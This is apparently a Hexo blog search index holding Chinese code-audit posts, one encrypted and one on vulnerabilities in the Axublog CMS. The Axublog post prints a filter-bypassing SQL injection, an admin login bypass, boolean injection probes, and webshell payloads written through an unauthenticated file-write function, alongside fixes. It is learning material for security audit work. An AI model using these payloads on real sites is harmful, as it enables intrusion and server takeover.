<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>188jianzhan SQL注入漏洞代码审计</title>
    <url>/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ff6ba58fb2aee779ee9884be7fa81e917c4d8d3ceff42767492463a85ac24e99">7f72502a417ec5d3e785d86e3c7240c8543f7b25d0690aae79fb85f4d15385ed5fe309ca0c297fa3a8bd8b1c1223a70cb8d7c64368057cf60f41349d86aacf6736aa015fe04cd35b0be3b81d6879aa6af3932a4a4a0af2ead4ff451de8c40a66a6a3c0e20481256d236700b6b4e5e0b75a4e0153cc0d7f0ab4b2142af76bb3484cb2aa0ef593628e4cb2539e33b02f2b7e28ec238225057d409994c89f81c70c809fe6e6fda49f90793ed92e355747994b96ef7aa2bd43e39a9aff0946117a97f70831c6adb74ccd555ddad2582ee8ee3b4793bee45fd3881ee36d20de2056105b681baf7be433e014d5529d6bce2f188fe4d8db1dbcc3a1247f8fa12898bdc36dc288713350f9c219226dd9b8ab89dede423e0b7f8382539b562d3a5f042b2b41efe9c01ca835e3be2edaf8de8981ccaf044e755da144c95e6d7fe9f79a1886f789195846e0669b886101ba0d093dcfb99efa49fa78b62d02e5d9ea40425674c97f08dec2d7d025d151f56d41f33016305016203fc5501baeae86291a1c640d3f4a603b253b47a75f71bad9ef16ebcfa244674714f5fb5fa7a2952b0788bb4814153859a32508e4e72592c157df8161687ba2b37320c68639491aab6a94731fe22dc8cd1207304f55fb9d0a33391ece934551b08665795b91c3ee80cb6a22eec57d576873edd07336bd6c0a2206091940cac64dfa7799d40c1422fadc2c4c11fb2fcb317d07f11da2c53a670b4ca59ef367e4253435e2b6be841f52b8bc082518dda10dd5bae54e416d4bb3c867bf8afef34e4ec5a1571a7b476f8880a8d46a7f0028c9c481c0609f050018423b1f43d82b381246466de91a251b0cd9ba0ba3844573c789a37ec5701aabcec0fc8018c9507fccbf6a0c5d7ea4104410c74ca1d782ccb1c7f8280a6289160f97e954bea95e0f47e85d752b41df906df42edee3c4a9628a154b5f6c134e14352e4292a7495a187bcde3538c940b3db661ee08b2832edd7df25e4b21cefaffce3bd4c903e7c70dfcc107257a99cf1ed1427cb24dabc96be3013c47fd1118a593cdda5abbd0352faa47fd9cbf349d42b0b2423cead0fbdd8d0e4893376b3a81ba31c0e577b8d8cd5020df9aced6812ee2943f6100afee160a676bfb8cfc7c093f05442ad3d4f0200582f37d8c0d9954ae8c64074e01ebdd5e030e02836c3b2aedee69502cc3566c480caf1bb50cd137d891ece487a670bc3e4634ff41999ded90cf76787dbe5c2bd2dc002107d003a1dd579f385ef35befe98a8c0508758c48c33f51ed4431c4dc34da0e29c540319984c6f51e53d489ce6b7a332502e474219562b0658f1dc52ba70f16feb1b09e179607307689cf477972a8901c6c779cb69562383ad34ec52998d9cb17427c404a3d84be44c2419e1a5442461d52dbe212c08778679336bd96fb0d8f837b7cef6777e699c7cb7daf88abf165348d50dd93da353536b61e236080e58eb24397e1483f485b9f7e6f18173a9bd2cf3efa00de54dd8bd8a2c4755c6b33a671d1c5e52ffbb2647fb06a771f5b926c758d6e955b5ae7467c49e2c06e228439d5f4829093816dd7dddbd2ec344523f9948c080ba05692ec45dfbff7d4388e19bf9838807544d6396367a7591bd0b99ccbfc75bad97c392dc702ff7b16a448dcb375e04afaf6905b9755e593f245e647d0e46ac87a09f33dff7af15399b07138fcf15f53efceef495dfe058058e2238765d34bec79023401eeeb3ed9e414e5329daaae05aed67826843b627a897531dda552a5134afb988eab26cd6c49bfeea36744a89fd2b083fb64812a7375785d98046e601f3fca9e573a05a617e0f9f47148a7066bb118ed71beb0fda91c73863b87ad6e7a003537a42a6b2d927d40f314c90f154a0f930219ca0826e2fd24d4c617b1e431a14a22556c4f91a26a4992b0b290c235f70a6022f17025b714f5a7c20c22e5ac183b7970353f2feddbf528e0e27c9e8a0eeb3a44240cbdaeb613c3761ca2aad7db6a0f419e3a261e48e863ebfbdb485e1baf99eee85db81ba898412f3c39e1e01d17744766c14cf8d3e2e96ac660f736a9b7ba59418a7152bb52cf6e88e2690a28a2036a9cc60c2185b3d53deae8a815b2b4e65d64bdbf7755d6cc80f5cde8d7c457ec09fdd8b10c2ccc13d5a57e9daec8419f3fe52e8f09b2410f3aee22ea4f7d23adc2e93dc50205f3375a035a4574cc321897b6be5616d3d62c3d5aa2f7d09970d092be02eccdf2ca1304f890e23eeb54cc3130df35513e264737c0413fb8ae487051e5952eca39e1a645a216faff13be0c98e940885ec748f390b1f965c44df15a22e4a0a302085854f40f8556e4c94245979d4ae20488fa2ac1c33815ab03292a4069f8ba38bc3a9384e57bbef6b38c76cdd7a63938577ee4004fe45b8db5be24be4cd992ef63275076c4714386f599e73a69fcc63f8c180bac007307ecc8f0bbd46b661debe0973e385126d1f6e0b280920ac7b92cf760d2920eda80ca899ffb42af1aa0505feb0b62df97f2829d4165571a8a46654cfca3c4721a52d7cbc5209ca1495bdacfd41165aefc4d60d5e9568c9e5c49b684a1e3f4a716ffdde89c17401382823069c77dbd64d1dcee2f3ef61796e2568074830c4fe8b25bf8267cc77aa68ce50ffddd2d101ba7b4bb8fabc2fb7045e78111d4a1b7e9f724388d2ccb194400aa83d881def01623a2f91181fb718899eebf85e49377bda4d4c5a123be7e2a6a5d57db0e6dd522a70c1fb1264913462c17a60d7672705f7c4e85df008f071b094fa04a1c1bcf5d0c7a3a96a22665b16a1559dc2129a1b88a4efe5d77fa19157af68dc133541f701817f23faf2b06304eb4f6b423960f21889330ac4b6e151a48652fd97ea7bf74aaf21e532736c59193eca844e7f1af450fdcd77569780154f4a9476a2b7f7c1fba6aa041d2141b9f35f13f4229c95934240aad096127fd8986b30f29a9a14d9f343d0df1a7c3c3b28bef8a52e9289fe01caa48813bafd45decca403883fe48e8d0876efc406c85e25f0341bffe58c30d98410c248b81160f2610af9cf82f055ef31db5b15785676f5793e3dfaeff904393c3faf61509a3f998d6d1d88af93ff16922093f506098f058e95e5dc7bbc2076d64819d86d8c24c90f7a68d2a88971d2dd1b81a9ff1095691906178066a038db82ea111bf17fca0db93c98b81f52c4b19f6b2dbbbc40ea6c5f4b8a1f936a7f6c3c23abfce48d1ac3ef8c3c1991b26918a51ee434916711853295d2ad1187b3b11a72f3a13ec22e13145e56d97891d487e83e1f664d20c8453378a62d06d0a76714b4d56391f5388a296ae7aea3ecf900163c56323d190b48e62bdaa7e4c91d35ea0be3842829b37e43dde3d94db08dba693c8a2f3cf00204176bd78a47191b1e22b449bf3dac32203092cf3b0360f666aef3367cf87319c4b663fd3d1719c47c734c3ed8c995a0820ca6ede96b6da324e84c5fcd40a384e7075e0f28ec0164a72fbc613b0f661fa0c0a405becbe354e02671ccf199eae362ee805f6d0aa341a9b1b9a7dab99e6fa5efb2486aa7c868c7c150b7fa74d1c85e59f32f1281fa8bfc5ffb313b44b29e5c444501c613fe3f7e1dd2d8a42f4173dbdcd3242734de3e0c190f8e501a06c938cd8ddc265f6aa039382631bcb96c4ead658db3c94883dcff15cc5b7496dd8202b70b1b7848297c608d23766a8c697b3f907d80d75260fd4cc3fd7dd20100c22a744c58bba54627cd1457cd408475b5d567ce2d361dc9eb7f5bca5220a0be229f4cca69d2880946c900d4e708d0f632482eaff39884b97a2681687e9511a5c8d8de9a276da00124653fd5f63aa5e74d8f307a578fd315142f330308d9021f98c51968f72678760651ce4a7ef87f459b4fc1ddd1cbce6881bdf90b43938a8e56ca4fcf1826cee62e050a7ec57ed25c369fce70a7f7f9faf846fbcdb815906863cb91403d180f93ba0d44d84217d378029d686f1507ee553a5116461e4f1e6ff0dff250347391000db3eed0cebddbb2e294896b8db82688f8e7965c512976d71c1dcd17bf75f10ea06b67ab24594b96bcf75e5d98cb7cb645b3b7b62e8fe518c5e6a7afc7ec49f2a00053a1d07aab7c9902905e42a728a8488dc826e53fdcc72656e55430a94e7949b0c29f3c8bab66e1675eaed38416c8a8f6d6836e2d5082322255c7d908b049d779859145ae292c3d6291b4aa59d7fc36638ab1a6e4535d9d2791f7fe78a7995a6c2744310cad5b7e650e3076f0d458f0f341c63e4a6103e76ea7e9c21bb009856280798fcd2e85113623034f68c709ebfeee1c5635606bfe3edd490befdce8c0d679dfa0cb26ae97794120be2eb736a4fa7b4a24b84739829ed410fd9ef8f5a9a411db54d07f9f9a20353fc27f21ef821eb2cc2a27f256136403bb8ee3777f94904647aca4d4425074d96df4ba368b8ebc7aea751f4fe6dd28080f0c6936c71aee752e7430a233f1732fc3565e6cc43fc402c9f429eb84bfdae185d0aba096dd910a9a2fabb1e5acf5375cbe12161ff264eea950a561f90837592cfab05c77ba600968e6504381aa8978af9c0952ddedc6871380f162b0f293f530052fafd0add9d9b968fe1ed86c093028b156bb02350b2ccf063a60b12beb654956de5c1aecb5f16b73ac34ac690e002c57e13ef72e1ceb06b059b0696a34e9529a6041831725bf7680513340b0f3b3d9e4868a636f2a84c9d995f63c33767</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>php代码审计学习</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Axublog代码审计学习</title>
    <url>/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"cmsconfig.php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"class/c_other.php"</span>);</span></span><br><span class="line"><span class="php">sqlguolv();</span></span><br><span class="line"></span><br><span class="line"><span class="php">$g=$_GET[<span class="string">'g'</span>];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($g==<span class="string">'arthit'</span>)&#123;</span></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];        </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($id!=<span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">$tab=$tabhead.<span class="string">"arts"</span>;</span></span><br><span class="line"><span class="php">mysql_select_db($tab);</span></span><br><span class="line"><span class="php">$sql=mysql_query(<span class="string">"UPDATE "</span>.$tab.<span class="string">" SET hit=hit+1 where id="</span>.$id);  <span class="comment">//直接将$_GET['id']提取的                                                                      id带入sql查询，没有经过																	  有效过滤</span></span></span><br><span class="line"><span class="php">$sql = mysql_query(<span class="string">"select * from "</span>.$tab.<span class="string">" where id="</span>.$id);</span></span><br><span class="line"><span class="php">$row=mysql_fetch_array($sql);</span></span><br><span class="line"><span class="php">    $str=$row[<span class="string">'hit'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'document.write('</span>.$str.<span class="string">');'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们尝试直接传入payload尝试：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/hit/php?g=archit&amp;id=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>发现被拦截。</p>
<p>我们发现在get传参之前，有一个过滤函数。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="title">sqlguolv</span>()==<span class="number">1</span>)&#123;<span class="title">die</span>(<span class="string">'禁止输入特殊符号和非法访问！'</span>);&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们找到这个函数：位于axublog\class\c_other.php:690行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">sqlguolv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">@header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</span><br><span class="line">$a=<span class="string">'/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\"|\'|\\*|\*|union|into/i'</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($a,$_SERVER[<span class="string">'QUERY_STRING'</span>])==<span class="number">11</span> <span class="keyword">or</span> preg_match($a,file_get_contents(<span class="string">"php://input"</span>))==<span class="number">11</span> )&#123;<span class="keyword">return</span> <span class="string">"1"</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>_SERVER[‘QUERY_STRING’]获取查询语句，一般是问号后面的字符串，然后使用preg_match()函数来匹配正则表达式。但是有一个问题：</p>
<p>使用$_SERVER[‘QUERY_STRING’]不会对传入的字符进行URL解码操作，</p>
<p>而$_GET时候会进行一次URL解码。所以我们可以使用url编码的方式绕过检测。</p>
<p>我们可以分别对字母u和s进行url编码为：%75 %73，得到paylaod:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?g=arthit&amp;id=<span class="number">-1</span>%<span class="number">20</span>%<span class="number">75</span>nion%<span class="number">20</span>%<span class="number">73</span>elect%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,database(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span></span><br></pre></td></tr></table></figure>

<h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$_SERVER[<span class="string">'QUERY_STRING'</span>]=urldecode($_SERVER[<span class="string">'QUERY_STRING'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">id</span>=intval($<span class="built_in">id</span>);</span><br></pre></td></tr></table></figure>

<p>3.使用预编译技术和数据库进行交互。</p>
<h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p>
<h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">@$g=$_GET[<span class="string">"g"</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"jspost.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">switch</span> ($g)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">default</span>:index();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="string">"index"</span>:index();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="string">"savechoose"</span>:savechoose();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="string">"edit"</span>:edit();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">	    <span class="keyword">case</span> <span class="string">"edit2"</span>:edit2();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">		<span class="keyword">case</span> <span class="string">"edit2save"</span>:edit2save();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    &#125;</span></span><br></pre></td></tr></table></figure>

<p>当我们传入<code>?g=edit2save</code>即可调用edit2save()的函数。</p>
<p>我们继续观察该函数功能：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">edit2save</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">global</span> $themepath;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"yj_green"</span> <span class="attr">id</span>=<span class="string">full</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b1"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b2"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b3"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b4"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"boxcontent"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?"</span>&gt;</span>主题管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span> &gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.go(-2)"</span>&gt;</span>编辑主题<span class="tag">&lt;/<span class="name">a</span>&gt;</span> &gt; 编辑文件 &gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.back()"</span>&gt;</span>返回<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"t1"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"t2"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$path=$_REQUEST[<span class="string">'path'</span>];</span></span><br><span class="line"><span class="php">$content=stripslashes($_REQUEST[<span class="string">'content'</span>]);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>编辑文件：<span class="php"><span class="meta">&lt;?</span>=$path<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($path==<span class="string">''</span>)&#123;<span class="keyword">echo</span><span class="string">'文件路径错误！'</span>;<span class="keyword">exit</span>;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(file_put_contents ($path, $content))&#123;<span class="keyword">echo</span><span class="string">"保存文件成功！"</span>;&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;<span class="keyword">echo</span><span class="string">"保存文件失败！"</span>;&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>​    在这个方法中，$path和$content分别表示路径和文件内容，用户可控，最后把这两个参数传入file_put_contents中进行保存操作。</p>
<p>我们可以构造写入webshell的payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?g=edit2save&amp;path=../shell.php&amp;content=<span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>@<span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>成功拿到webshell.</p>
<h5 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h5><p>我们根据上下函数可知，此处调用该函数的目的是为了about页面：</p>
<p>所以我们可以对path进行白名单校验，或者直接将路径写死：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$path</span>!=<span class="string">'../theme/default/about.mb'</span>)&#123;</span><br><span class="line">	echo <span class="string">'about.mb地址不正确'</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="后台生成about页面getshell"><a href="#后台生成about页面getshell" class="headerlink" title="后台生成about页面getshell"></a>后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p>
<h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">include($mb);</span><br><span class="line">$html = ob_get_contents ();</span><br><span class="line">ob_clean();</span><br><span class="line">$html=mbreplace($html);</span><br><span class="line">file_put_contents ($cache, $html);</span><br><span class="line"></span><br><span class="line">echo '生成about.html成功: <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">blank</span> <span class="attr">href</span>=<span class="string">"'.$cache.'"</span>&gt;</span>访问<span class="tag">&lt;/<span class="name">a</span>&gt;</span>';</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b4b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b3b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b2b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b1b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这里使用include函数包含about.mb将其中php的语句执行后再将一些标签替换成变量的值，最后把处理的结果放入<code>$cache</code>变量中再将其写入<code>aout.html</code>页面。</p>
<p>我们在about.mb尾部添加如下代码：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">file<span class="constructor">_put_contents('..<span class="operator">/</span><span class="params">shell</span>.<span class="params">php</span>','&lt;?<span class="params">php</span> @<span class="params">eval</span>($<span class="params">_GET</span>[<span class="string">"a"</span>])</span>; ?&gt;'); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后使用菜刀连接即可getshell。</p>
<h4 id="后台登录处的sql注入漏洞"><a href="#后台登录处的sql注入漏洞" class="headerlink" title="后台登录处的sql注入漏洞"></a>后台登录处的sql注入漏洞</h4><h5 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303210401433-2074327058.png" alt></p>
<p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303211200124-595595133%5B1%5D.png" alt></p>
<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">user:admin'</span> <span class="string">or</span> <span class="number">1</span><span class="string">=1#</span></span><br><span class="line"><span class="attr">psw:</span> <span class="string">随意</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="attr">user:</span> <span class="string">admin'</span> <span class="string">or</span> <span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="attr">psw:</span> <span class="string">随意</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303211645255-577074129%5B1%5D.png" alt></p>
<h4 id="前台反射型xss漏洞"><a href="#前台反射型xss漏洞" class="headerlink" title="前台反射型xss漏洞"></a>前台反射型xss漏洞</h4><h5 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303232615102-565416911%5B1%5D.png" alt></p>
<p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303234054140-229902481%5B1%5D.png" alt></p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303233948167-467235758%5B1%5D.png" alt></p>
<p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303234320733-213715566%5B1%5D.png" alt></p>
<h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303234506377-737313316.png" alt="img"></p>
<h4 id="前台sql注入漏洞"><a href="#前台sql注入漏洞" class="headerlink" title="前台sql注入漏洞"></a>前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200303234835707-2141296773.png" alt="img"></p>
<p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p>
<p>漏洞利用：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">执行如下poc时候返回正确结果：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.110.152/axublog/search.php?word=广%' or 1=1--+</span></span><br><span class="line">执行如下poc时候无结果返回：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.110.152/axublog/search.php?word=广%' or 1=2--+</span></span><br></pre></td></tr></table></figure>

<h4 id="后台任意文件写入漏洞"><a href="#后台任意文件写入漏洞" class="headerlink" title="后台任意文件写入漏洞"></a>后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p>
<p>漏洞点：admin/theme.php</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304002821492-309441952.png" alt></p>
<p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p>
<p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p>
